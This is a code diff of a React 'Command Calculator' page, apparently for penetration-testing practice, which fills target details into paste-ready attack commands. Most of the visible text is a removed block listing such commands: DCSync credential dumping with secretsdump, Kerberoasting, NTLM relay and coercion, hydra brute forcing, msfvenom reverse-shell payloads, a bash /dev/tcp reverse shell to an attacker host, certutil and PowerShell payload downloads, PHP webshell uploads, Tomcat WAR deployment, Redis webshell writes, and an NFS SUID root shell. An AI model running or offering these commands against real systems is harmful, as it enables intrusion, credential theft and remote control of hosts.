@@ -1,41 +1,99 @@
 import React, { useState, useMemo } from "react";
 
 /**
- * Command Calculator — standalone page for The Path.
- * Pick a service, get its full command set (all phases) with your variables
- * substituted in. The auth toggle (password / NTLM hash / Kerberos) rewrites
- * AD commands at once. Global filter searches across every service.
- * Self-contained: no external deps. Drop in as a route like the pivot calculator.
+ * Command Calculator — a standalone page for The Path.
+ * Fill the variable bar once; get paste-ready commands across your toolset.
+ * The auth-mode toggle (password / NTLM hash / Kerberos) rewrites EVERY command.
+ * Self-contained: no external CSS/UI deps. Drop in as a route like the pivot calculator.
  */
 
+const FIELDS = [
+  { k: "ip", label: "Target IP", ph: "10.10.10.5" },
+  { k: "dcip", label: "DC IP", ph: "10.10.10.10" },
+  { k: "host", label: "Hostname", ph: "dc01.corp.local" },
+  { k: "domain", label: "Domain", ph: "corp.local" },
+  { k: "user", label: "User", ph: "jdoe" },
+  { k: "secret", label: "Password / Hash", ph: "Password123!", secret: true },
+  { k: "lhost", label: "LHOST (tun0)", ph: "10.10.14.7" },
+  { k: "lport", label: "LPORT", ph: "4444" },
+];
+
+const AUTH = [
+  { id: "pw", label: "Password" },
+  { id: "hash", label: "NTLM Hash" },
+  { id: "krb", label: "Kerberos" },
+];
+
+// split a command string into plain text + amber <TOKEN> placeholders
+function tokenize(cmd) {
+  return cmd.split(/(<[A-Z0-9_]+>)/g).map((part, i) =>
+    /^<[A-Z0-9_]+>$/.test(part)
+      ? <span key={i} className="tok">{part}</span>
+      : <span key={i}>{part}</span>
+  );
+}
+
+function CmdCard({ label, cmd, note }) {
+  const [copied, setCopied] = useState(false);
+  const copy = () => {
+    navigator.clipboard?.writeText(cmd);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 1400);
+  };
+  return (
+    <div className="cmd" onClick={copy} title="Click to copy">
+      <div className="cmd-head">
+        <span className="cmd-label">{label}</span>
+        <span className={`cmd-copy${copied ? " ok" : ""}`}>{copied ? "copied" : "copy"}</span>
+      </div>
+      <pre className="cmd-text">{tokenize(cmd)}</pre>
+      {note && <div className="cmd-note">{note}</div>}
+    </div>
+  );
+}
+
+function Chip({ label, value }) {
+  const [copied, setCopied] = useState(false);
+  const copy = () => {
+    navigator.clipboard?.writeText(value);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 1400);
+  };
+  return (
+    <div className="chip" onClick={copy} title="Click to copy">
+      <span className="chip-label">{label}</span>
+      <span className="chip-val">{copied ? "copied" : value}</span>
+    </div>
+  );
+}
+
 export default function CommandCalculator() {
-  const [ip, setIp] = useState("");
-  const [dcip, setDcip] = useState("");
-  const [host, setHost] = useState("");
-  const [domain, setDomain] = useState("");
-  const [user, setUser] = useState("");
-  const [secret, setSecret] = useState("");
-  const [authMode, setAuthMode] = useState("pw"); // pw | hash | krb
-  const [lhost, setLhost] = useState("");
-  const [lport, setLport] = useState("443");
-  const [wordlist, setWordlist] = useState("/usr/share/wordlists/rockyou.txt");
-  const [service, setService] = useState("ad");
+  const [f, setF] = useState({
+    ip: "", dcip: "", host: "", domain: "", user: "", secret: "", lhost: "", lport: "",
+  });
+  const [authMode, setAuthMode] = useState("pw");
+  const [active, setActive] = useState("setup");
   const [filter, setFilter] = useState("");
-  const [copied, setCopied] = useState(null);
-  const [collapsed, setCollapsed] = useState({});
 
-  const IP = ip || "<IP>";
-  const DCIP = dcip || ip || "<DCIP>";
-  const HOST = host || "<HOST>";
-  const D = domain || "<DOMAIN>";
-  const U = user || "<USER>";
-  const LH = lhost || "<LHOST>";
-  const LP = lport || "443";
-  const WL = wordlist || "<WORDLIST>";
-  const SEC = secret || (authMode === "hash" ? "<HASH>" : "<PASS>");
-  const baseDN = domain ? domain.split(".").map((p) => `dc=${p}`).join(",") : "dc=<DOMAIN>";
-  const NB = domain ? (domain.split(".")[0] || "").toUpperCase() : "<NB>";
+  const set = (k) => (e) => setF((v) => ({ ...v, [k]: e.target.value }));
 
+  // ── derived tokens ──────────────────────────────────────
+  const IP = f.ip || "<IP>";
+  const DCIP = f.dcip || "<DC_IP>";
+  const HOST = f.host || "<HOST>";
+  const D = f.domain || "<DOMAIN>";
+  const U = f.user || "<USER>";
+  const SEC = f.secret || (authMode === "hash" ? "<HASH>" : "<PASS>");
+  const LHOST = f.lhost || "<LHOST>";
+  const LPORT = f.lport || "4444";
+  const baseDN = f.domain ? f.domain.split(".").map((p) => `dc=${p}`).join(",") : "dc=<DOMAIN>";
+  const NB = f.domain ? (f.domain.split(".")[0] || "").toUpperCase() : "<NB>";
+  const hostsLine = `${IP}\t${HOST} ${D} ${HOST.split(".")[0]}`;
+
+  // target host: Kerberos demands the hostname, everything else the IP
+  const TH = authMode === "krb" ? HOST : IP;
+
+  // ── auth-aware fragment builders ────────────────────────
   const impTgt = (forceHost = false) => {
     const t = authMode === "krb" || forceHost ? HOST : IP;
     if (authMode === "pw") return `'${D}/${U}:${SEC}@${t}'`;
@@ -47,651 +105,414 @@ export default function CommandCalculator() {
     if (authMode === "hash") return `-u '${U}' -H '${SEC}'`;
     return `-u '${U}' -k`;
   };
+  const winrmAuth =
+    authMode === "pw" ? `-p '${SEC}'` : authMode === "hash" ? `-H ${SEC}` : `-r ${D}`;
   const ldapAuth = `-D "${U}@${D}" -w '${SEC}'`;
 
-  const services = useMemo(() => {
-    const L = `ldap://${IP}`;
-    return {
-      ad: {
-        name: "AD Attacks", port: "core",
-        groups: [
-          { phase: "Auth & Exec", cmds: [
-            { label: "psexec", cmd: `impacket-psexec ${impTgt()}` },
-            { label: "wmiexec", cmd: `impacket-wmiexec ${impTgt()}` },
-            { label: "smbexec", cmd: `impacket-smbexec ${impTgt()}` },
-            { label: "atexec (single cmd)", cmd: `impacket-atexec ${impTgt()} 'whoami'` },
-          ]},
-          { phase: "Credentials", cmds: [
-            { label: "secretsdump — DCSync (NTLM)", cmd: `impacket-secretsdump ${impTgt()} -just-dc-ntlm -outputfile dcsync` },
-            { label: "secretsdump — one user", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user Administrator` },
-            { label: "secretsdump — krbtgt", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user krbtgt` },
-            { label: "secretsdump — local (SAM/LSA)", cmd: `impacket-secretsdump ${impTgt()}` },
-            { label: "Password spray", cmd: `nxc smb ${IP} -u users.txt -p '${SEC}' --continue-on-success` },
-          ]},
-          { phase: "Roasting", cmds: [
-            { label: "nxc — kerberoast", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting kerb.txt` },
-            { label: "GetUserSPNs — kerberoast", cmd: authMode === "krb" ? `impacket-GetUserSPNs -k -no-pass -dc-host ${HOST}.${D} ${D}/ -request -outputfile kerb.txt` : `impacket-GetUserSPNs '${D}/${U}:${SEC}' -dc-ip ${DCIP} -request -outputfile kerb.txt` },
-            { label: "nxc — AS-REP roast", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
-            { label: "GetNPUsers — AS-REP (no creds)", cmd: `impacket-GetNPUsers ${D}/ -usersfile users.txt -dc-ip ${DCIP} -request -format hashcat -outputfile asrep.txt` },
-          ]},
-          { phase: "Relay & Poison", cmds: [
-            { label: "responder", cmd: `sudo responder -I tun0 -dwv` },
-            { label: "ntlmrelayx — interactive", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support -i` },
-            { label: "Coerce (PetitPotam)", cmd: `python3 PetitPotam.py -u '${U}' -p '${SEC}' -d ${D} ${LH} ${IP}` },
-          ]},
-        ],
-      },
-      ldap: {
-        name: "LDAP", port: "389 / 636 / 3268",
-        groups: [
-          { phase: "Connect", cmds: [
-            { label: "Anonymous bind", cmd: `ldapsearch -x -H ${L} -b "${baseDN}"` },
-            { label: "Authenticated (UPN)", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}"` },
-            { label: "LDAPS (636)", cmd: `ldapsearch -x -H ldaps://${IP}:636 ${ldapAuth} -b "${baseDN}"` },
-            { label: "ldapwhoami — test auth", cmd: `ldapwhoami -x -H ${L} ${ldapAuth}` },
-          ]},
-          { phase: "Recon", cmds: [
-            { label: "nmap — ports", cmd: `nmap -p 389,636,3268 ${IP}` },
-            { label: "nmap — rootDSE script", cmd: `nmap -p 389 -sV --script ldap-rootdse ${IP}` },
-            { label: "Root DSE", cmd: `ldapsearch -x -H ${L} -b "" -s base "(objectclass=*)"` },
-            { label: "Naming contexts (base DNs)", cmd: `ldapsearch -x -H ${L} -b "" -s base namingContexts` },
-            { label: "All rootDSE attributes", cmd: `ldapsearch -x -H ${L} -b "" -s base "(objectclass=*)" "*" "+"` },
-          ]},
-          { phase: "Enumeration", cmds: [
-            { label: "Domain info", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=domain)"` },
-            { label: "All users", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=person)"` },
-            { label: "Users — sAMAccountName", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" sAMAccountName` },
-            { label: "Groups", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=group)" cn` },
-            { label: "Domain Admins members", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(cn=Domain Admins)" member` },
-            { label: "Computers", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=computer)" cn operatingSystem` },
-            { label: "Domain controllers", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dNSHostName` },
-          ]},
-          { phase: "Attribute hunting", cmds: [
-            { label: "Description fields (creds!)", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(description=*)" description | grep -i "pass\\|pwd\\|secret"` },
-            { label: "info field", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(info=*)" info` },
-            { label: "Emails", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(mail=*)" mail` },
-          ]},
-          { phase: "Attack vectors", cmds: [
-            { label: "Null bind", cmd: `ldapsearch -x -H ${L} -D "" -w "" -b "${baseDN}"` },
-            { label: "Password-never-expires users", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(userAccountControl:1.2.840.113556.1.4.803:=65536)" sAMAccountName` },
-            { label: "Kerberoastable (SPN set)", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` },
-            { label: "AS-REP roastable (no preauth)", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName` },
-            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt ${IP} ldap2 -s 389` },
-          ]},
-          { phase: "Post-ex / dump", cmds: [
-            { label: "Full user dump → ldif", cmd: `ldapsearch -x -H ${L} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" "*" "+" > all_users.ldif` },
-            { label: "ldapdomaindump", cmd: `ldapdomaindump -u '${D}\\${U}' -p '${SEC}' ${IP}` },
-            { label: "windapsearch — users", cmd: `windapsearch -d ${D} -u ${U} -p '${SEC}' --dc-ip ${DCIP} -U` },
-            { label: "Add user to Domain Admins (.ldif)", cmd: `ldapmodify -x -H ${L} ${ldapAuth} -f add_admin.ldif` },
-          ]},
-        ],
-      },
-      smb: {
-        name: "SMB", port: "139 / 445",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nxc — fingerprint", cmd: `nxc smb ${IP}` },
-            { label: "nmap — vuln scripts", cmd: `nmap -p445 --script "smb-vuln-*" ${IP}` },
-            { label: "enum4linux-ng", cmd: `enum4linux-ng -A ${IP}` },
-          ]},
-          { phase: "Enumeration", cmds: [
-            { label: "nxc — shares", cmd: `nxc smb ${IP} ${nxcA()} --shares` },
-            { label: "nxc — users", cmd: `nxc smb ${IP} ${nxcA()} --users` },
-            { label: "nxc — RID brute", cmd: `nxc smb ${IP} ${nxcA()} --rid-brute` },
-            { label: "nxc — password policy", cmd: `nxc smb ${IP} ${nxcA()} --pass-pol` },
-            { label: "smbclient — list shares", cmd: `smbclient -L //${IP}/ -U '${D}\\${U}%${SEC}'` },
-            { label: "smbmap", cmd: `smbmap -H ${IP} -d ${D} -u '${U}' -p '${SEC}'` },
-            { label: "lookupsid (RID)", cmd: `impacket-lookupsid '${D}/${U}:${SEC}@${IP}'` },
-          ]},
-          { phase: "Access", cmds: [
-            { label: "smbclient — connect share", cmd: `smbclient //${IP}/SHARE -U '${D}\\${U}%${SEC}'` },
-            { label: "Mount share", cmd: `sudo mount -t cifs //${IP}/SHARE /mnt/share -o username=${U},password=${SEC},domain=${D}` },
-            { label: "nxc — spider shares", cmd: `nxc smb ${IP} ${nxcA()} -M spider_plus` },
-            { label: "Null session", cmd: `nxc smb ${IP} -u '' -p ''` },
-          ]},
-        ],
-      },
-      kerberos: {
-        name: "Kerberos", port: "88",
-        groups: [
-          { phase: "Enumeration", cmds: [
-            { label: "kerbrute — userenum", cmd: `kerbrute userenum -d ${D} --dc ${DCIP} users.txt` },
-            { label: "nmap — enum users", cmd: `nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='${D}' ${IP}` },
-          ]},
-          { phase: "Roasting", cmds: [
-            { label: "GetUserSPNs — kerberoast", cmd: `impacket-GetUserSPNs '${D}/${U}:${SEC}' -dc-ip ${DCIP} -request -outputfile kerb.txt` },
-            { label: "GetNPUsers — AS-REP roast", cmd: `impacket-GetNPUsers ${D}/ -usersfile users.txt -dc-ip ${DCIP} -request -format hashcat -outputfile asrep.txt` },
-          ]},
-          { phase: "Tickets", cmds: [
-            { label: "getTGT (request ticket)", cmd: `impacket-getTGT '${D}/${U}:${SEC}' -dc-ip ${DCIP}` },
-            { label: "Use ticket", cmd: `export KRB5CCNAME=${U}.ccache` },
-            { label: "kerbrute — password spray", cmd: `kerbrute passwordspray -d ${D} --dc ${DCIP} users.txt '${SEC}'` },
-          ]},
-        ],
-      },
-      mssql: {
-        name: "MSSQL", port: "1433",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — info", cmd: `nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info ${IP}` },
-            { label: "nxc — check", cmd: `nxc mssql ${IP} ${nxcA()}` },
-          ]},
-          { phase: "Connect", cmds: [
-            { label: "mssqlclient (Windows auth)", cmd: `impacket-mssqlclient '${D}/${U}:${SEC}@${IP}' -windows-auth` },
-            { label: "mssqlclient (SQL auth)", cmd: `impacket-mssqlclient '${U}:${SEC}@${IP}'` },
-            { label: "nxc — run query", cmd: `nxc mssql ${IP} ${nxcA()} -q 'SELECT name FROM sys.databases'` },
-          ]},
-          { phase: "Exec", cmds: [
-            { label: "nxc — xp_cmdshell", cmd: `nxc mssql ${IP} ${nxcA()} -x 'whoami'` },
-            { label: "Enable xp_cmdshell", cmd: `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` },
-            { label: "Capture hash (xp_dirtree)", cmd: `EXEC master..xp_dirtree '\\\\${LH}\\share'` },
-          ]},
-        ],
-      },
-      mysql: {
-        name: "MySQL", port: "3306",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — enum", cmd: `nmap -p3306 --script mysql-info,mysql-empty-password,mysql-enum ${IP}` },
-          ]},
-          { phase: "Connect", cmds: [
-            { label: "mysql client", cmd: `mysql -h ${IP} -u ${U} -p'${SEC}'` },
-            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt ${IP} mysql` },
-          ]},
-          { phase: "Post-ex", cmds: [
-            { label: "Dump users/hashes", cmd: `SELECT user,authentication_string FROM mysql.user;` },
-            { label: "Read file (FILE priv)", cmd: `SELECT LOAD_FILE('/etc/passwd');` },
-          ]},
-        ],
-      },
-      winrm: {
-        name: "WinRM", port: "5985 / 5986",
-        groups: [
-          { phase: "Check", cmds: [
-            { label: "nxc — check", cmd: `nxc winrm ${IP} ${nxcA()}` },
-            { label: "nmap — detect", cmd: `nmap -p5985,5986 -sV ${IP}` },
-          ]},
-          { phase: "Shell", cmds: [
-            { label: "evil-winrm", cmd: authMode === "hash" ? `evil-winrm -i ${IP} -u '${U}' -H ${SEC}` : `evil-winrm -i ${IP} -u '${U}' -p '${SEC}'` },
-            { label: "nxc — exec", cmd: `nxc winrm ${IP} ${nxcA()} -x 'whoami'` },
-          ]},
-        ],
-      },
-      ssh: {
-        name: "SSH", port: "22",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — auth methods", cmd: `nmap -p22 --script ssh-auth-methods,ssh2-enum-algos ${IP}` },
-          ]},
-          { phase: "Access", cmds: [
-            { label: "ssh — password", cmd: `ssh ${U}@${IP}` },
-            { label: "ssh — key", cmd: `chmod 600 id_rsa && ssh -i id_rsa ${U}@${IP}` },
-            { label: "nxc — check", cmd: `nxc ssh ${IP} -u '${U}' -p '${SEC}'` },
-            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt ssh://${IP}` },
-          ]},
-        ],
-      },
-      rdp: {
-        name: "RDP", port: "3389",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — encryption", cmd: `nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info ${IP}` },
-            { label: "nxc — check", cmd: `nxc rdp ${IP} ${nxcA()}` },
-          ]},
-          { phase: "Access", cmds: [
-            { label: "xfreerdp", cmd: authMode === "hash" ? `xfreerdp /v:${IP} /u:${U} /pth:${SEC} /cert:ignore +clipboard /dynamic-resolution` : `xfreerdp /v:${IP} /u:${U} /p:'${SEC}' /cert:ignore +clipboard /dynamic-resolution` },
-            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt rdp://${IP}` },
-          ]},
-        ],
-      },
-      ftp: {
-        name: "FTP", port: "21",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — anon + scripts", cmd: `nmap -p21 --script ftp-anon,ftp-syst ${IP}` },
-          ]},
-          { phase: "Access", cmds: [
-            { label: "Anonymous login", cmd: `ftp ${IP}   # user: anonymous / pass: anything` },
-            { label: "Login", cmd: `ftp ${U}@${IP}` },
-            { label: "Mirror everything (wget)", cmd: `wget -r ftp://${U}:'${SEC}'@${IP}/` },
-            { label: "hydra — brute", cmd: `hydra -L users.txt -P passwords.txt ftp://${IP}` },
-          ]},
-        ],
-      },
-      snmp: {
-        name: "SNMP", port: "161 (udp)",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "snmpwalk (v2c, public)", cmd: `snmpwalk -v2c -c public ${IP}` },
-            { label: "snmp-check", cmd: `snmp-check ${IP}` },
-            { label: "onesixtyone — community brute", cmd: `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ${IP}` },
-          ]},
-          { phase: "Mining", cmds: [
-            { label: "Processes", cmd: `snmpwalk -v2c -c public ${IP} 1.3.6.1.2.1.25.4.2.1.2` },
-            { label: "Installed software", cmd: `snmpwalk -v2c -c public ${IP} 1.3.6.1.2.1.25.6.3.1.2` },
-            { label: "Listening ports", cmd: `snmpwalk -v2c -c public ${IP} 1.3.6.1.2.1.6.13.1.3` },
-          ]},
-        ],
-      },
-      smtp: {
-        name: "SMTP", port: "25 / 587",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — commands/users", cmd: `nmap -p25 --script smtp-commands,smtp-enum-users ${IP}` },
-            { label: "Banner / connect", cmd: `nc -nv ${IP} 25` },
-          ]},
-          { phase: "User enum", cmds: [
-            { label: "smtp-user-enum (VRFY)", cmd: `smtp-user-enum -M VRFY -U users.txt -t ${IP}` },
-            { label: "VRFY (manual)", cmd: `VRFY ${U}` },
-          ]},
-        ],
-      },
-      dns: {
-        name: "DNS", port: "53",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "Zone transfer (AXFR)", cmd: `dig axfr @${IP} ${D}` },
-            { label: "dnsenum", cmd: `dnsenum --dnsserver ${IP} ${D}` },
-            { label: "dnsrecon", cmd: `dnsrecon -d ${D} -n ${IP} -a` },
-            { label: "Reverse lookup", cmd: `dig -x ${IP} @${IP}` },
-          ]},
-        ],
-      },
-      payloads: {
-        name: "Payloads & Shells", port: "—",
-        groups: [
-          { phase: "msfvenom", cmds: [
-            { label: "aspx (IIS)", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f aspx -o shell.aspx` },
-            { label: "exe", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f exe -o shell.exe` },
-            { label: "elf (Linux)", cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f elf -o shell.elf` },
-            { label: "war (Tomcat)", cmd: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f war -o shell.war` },
-          ]},
-          { phase: "Reverse shells", cmds: [
-            { label: "bash", cmd: `bash -i >& /dev/tcp/${LH}/${LP} 0>&1` },
-            { label: "nc listener", cmd: `rlwrap -cAr nc -lvnp ${LP}` },
-          ]},
-        ],
-      },
-      transfer: {
-        name: "File Transfer", port: "—",
-        groups: [
-          { phase: "Serve (Kali)", cmds: [
-            { label: "HTTP server", cmd: `python3 -m http.server 80` },
-            { label: "SMB server", cmd: `impacket-smbserver share . -smb2support -user a -password a` },
-          ]},
-          { phase: "Pull (victim)", cmds: [
-            { label: "certutil (Win)", cmd: `certutil -urlcache -split -f http://${LH}/file.exe file.exe` },
-            { label: "PowerShell (Win)", cmd: `powershell -c "iwr http://${LH}/file.exe -OutFile file.exe"` },
-            { label: "wget (Linux)", cmd: `wget http://${LH}/file -O /tmp/file && chmod +x /tmp/file` },
-          ]},
-        ],
-      },
-      http: {
-        name: "HTTP / HTTPS", port: "80 / 443 / 8080",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — web ports + version", cmd: `nmap -p80,443,8080,8443 -sV ${IP}` },
-            { label: "nmap — http scripts", cmd: `nmap -p80 --script http-enum,http-methods,http-headers ${IP}` },
-            { label: "whatweb — fingerprint", cmd: `whatweb http://${IP}` },
-            { label: "Headers", cmd: `curl -s -I http://${IP}` },
-            { label: "OPTIONS — verbs (WebDAV tell)", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i allow` },
-            { label: "wafw00f — detect WAF", cmd: `wafw00f http://${IP}` },
-            { label: "nikto", cmd: `nikto -h http://${IP}` },
-          ]},
-          { phase: "Content discovery", cmds: [
-            { label: "feroxbuster", cmd: `feroxbuster -u http://${IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt` },
-            { label: "gobuster", cmd: `gobuster dir -u http://${IP} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt` },
-            { label: "ffuf — paths", cmd: `ffuf -u http://${IP}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` },
-            { label: "ffuf — vhosts", cmd: `ffuf -u http://${IP} -H "Host: FUZZ.${D}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0` },
-            { label: "robots.txt", cmd: `curl -s http://${IP}/robots.txt` },
-            { label: "Source/config leaks", cmd: `curl -s http://${IP}/.git/config ; curl -s http://${IP}/web.config` },
-          ]},
-          { phase: "Attack", cmds: [
-            { label: "hydra — basic auth", cmd: `hydra -l ${U} -P /usr/share/wordlists/rockyou.txt ${IP} http-get /admin` },
-            { label: "hydra — login form", cmd: `hydra -l ${U} -P passwords.txt ${IP} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"` },
-            { label: "PUT webshell (if enabled)", cmd: `curl -X PUT http://${IP}/shell.php -d '<?php system($_GET["cmd"]); ?>'` },
-            { label: "Trigger webshell", cmd: `curl "http://${IP}/shell.php?cmd=whoami"` },
-          ]},
-        ],
-      },
-      webdav: {
-        name: "WebDAV", port: "80 / 443",
-        groups: [
-          { phase: "Detect", cmds: [
-            { label: "OPTIONS — verbs", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i allow` },
-            { label: "nmap — webdav scan", cmd: `nmap -p80,443 --script http-webdav-scan ${IP}` },
-          ]},
-          { phase: "Test access", cmds: [
-            { label: "davtest (auth)", cmd: `davtest -url http://${IP} -auth '${U}:${SEC}'` },
-            { label: "cadaver (interactive)", cmd: `cadaver http://${IP}/` },
-          ]},
-          { phase: "Upload → RCE (IIS)", cmds: [
-            { label: "PUT as .txt", cmd: `curl -s -u '${U}:${SEC}' -X PUT http://${IP}/shell.txt --data-binary @shell.aspx` },
-            { label: "MOVE to .aspx", cmd: `curl -s -u '${U}:${SEC}' -X MOVE http://${IP}/shell.txt -H "Destination: http://${IP}/shell.aspx"` },
-            { label: "Trigger", cmd: `curl -s -u '${U}:${SEC}' "http://${IP}/shell.aspx"` },
-          ]},
-        ],
-      },
-      tomcat: {
-        name: "Tomcat", port: "8080 / 8009",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — version", cmd: `nmap -p8080,8443,8009 -sV ${IP}` },
-            { label: "Version page", cmd: `curl -s http://${IP}:8080/docs/ | grep -i "version"` },
-            { label: "Manager (browse)", cmd: `http://${IP}:8080/manager/html` },
-          ]},
-          { phase: "Brute manager", cmds: [
-            { label: "hydra — default creds", cmd: `hydra -L /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt ${IP} -s 8080 http-get /manager/html` },
-            { label: "List apps (authed)", cmd: `curl -u '${U}:${SEC}' http://${IP}:8080/manager/text/list` },
-          ]},
-          { phase: "WAR → RCE", cmds: [
-            { label: "Build WAR shell", cmd: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f war -o shell.war` },
-            { label: "Deploy", cmd: `curl -u '${U}:${SEC}' --upload-file shell.war "http://${IP}:8080/manager/text/deploy?path=/shell&update=true"` },
-            { label: "Trigger", cmd: `curl "http://${IP}:8080/shell/"` },
-            { label: "Undeploy (cleanup)", cmd: `curl -u '${U}:${SEC}' "http://${IP}:8080/manager/text/undeploy?path=/shell"` },
-          ]},
-          { phase: "Ghostcat (AJP 8009)", cmds: [
-            { label: "nmap — ajp methods", cmd: `nmap -p8009 --script ajp-methods,ajp-request ${IP}` },
-          ]},
-        ],
-      },
-      nfs: {
-        name: "NFS", port: "111 / 2049",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — nfs scripts", cmd: `nmap -p111,2049 -sV --script nfs-ls,nfs-showmount,nfs-statfs ${IP}` },
-            { label: "showmount — exports", cmd: `showmount -e ${IP}` },
-            { label: "rpcinfo", cmd: `rpcinfo -p ${IP}` },
-          ]},
-          { phase: "Mount", cmds: [
-            { label: "Mount share", cmd: `mkdir -p /mnt/nfs && sudo mount -t nfs ${IP}:/share /mnt/nfs -o nolock` },
-            { label: "Mount v3 (older)", cmd: `sudo mount -t nfs -o vers=3 ${IP}:/share /mnt/nfs` },
-            { label: "Find sensitive files", cmd: `find /mnt/nfs -name "*.key" -o -name "*.pem" -o -name "id_rsa" -o -name "*password*"` },
-          ]},
-          { phase: "Privesc", cmds: [
-            { label: "no_root_squash SUID (on Kali)", cmd: `cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash` },
-            { label: "...then on target", cmd: `/share/rootbash -p   # root shell` },
-            { label: "UID match (read owned files)", cmd: `sudo useradd -u 1000 fakeuser && su fakeuser` },
-          ]},
-        ],
-      },
-      postgres: {
-        name: "PostgreSQL", port: "5432",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — brute", cmd: `nmap -p5432 --script pgsql-brute ${IP}` },
-            { label: "nxc — check", cmd: `nxc postgres ${IP} -u ${U} -p '${SEC}'` },
-          ]},
-          { phase: "Connect", cmds: [
-            { label: "psql", cmd: `PGPASSWORD='${SEC}' psql -h ${IP} -U ${U} -d postgres` },
-            { label: "List databases", cmd: `\\\\l` },
-          ]},
-          { phase: "Exploit", cmds: [
-            { label: "RCE (COPY FROM PROGRAM)", cmd: `COPY cmd_exec FROM PROGRAM 'id';` },
-            { label: "Read file", cmd: `CREATE TABLE x(t text); COPY x FROM '/etc/passwd'; SELECT * FROM x;` },
-          ]},
-        ],
-      },
-      redis: {
-        name: "Redis", port: "6379",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — info", cmd: `nmap -p6379 --script redis-info ${IP}` },
-            { label: "Connect", cmd: `redis-cli -h ${IP}` },
-            { label: "Server info", cmd: `redis-cli -h ${IP} INFO` },
-          ]},
-          { phase: "Exploit", cmds: [
-            { label: "Webshell write", cmd: `redis-cli -h ${IP} config set dir /var/www/html; redis-cli -h ${IP} config set dbfilename shell.php; redis-cli -h ${IP} set x "<?php system(\\$_GET['c']); ?>"; redis-cli -h ${IP} save` },
-            { label: "SSH key write (dir = .ssh)", cmd: `cat id_rsa.pub | redis-cli -h ${IP} -x set sshkey` },
-          ]},
-        ],
-      },
-      pop3imap: {
-        name: "POP3 / IMAP", port: "110 / 143 / 993 / 995",
-        groups: [
-          { phase: "Recon", cmds: [
-            { label: "nmap — capabilities", cmd: `nmap -p110,143,993,995 --script pop3-capabilities,imap-capabilities ${IP}` },
-            { label: "Connect POP3", cmd: `nc -nv ${IP} 110` },
-            { label: "Connect IMAP", cmd: `nc -nv ${IP} 143` },
-          ]},
-          { phase: "Read mail (POP3)", cmds: [
-            { label: "Login + list", cmd: `USER ${U}` },
-            { label: "Password", cmd: `PASS ${SEC}` },
-            { label: "List / read", cmd: `LIST` },
-          ]},
-          { phase: "Brute", cmds: [
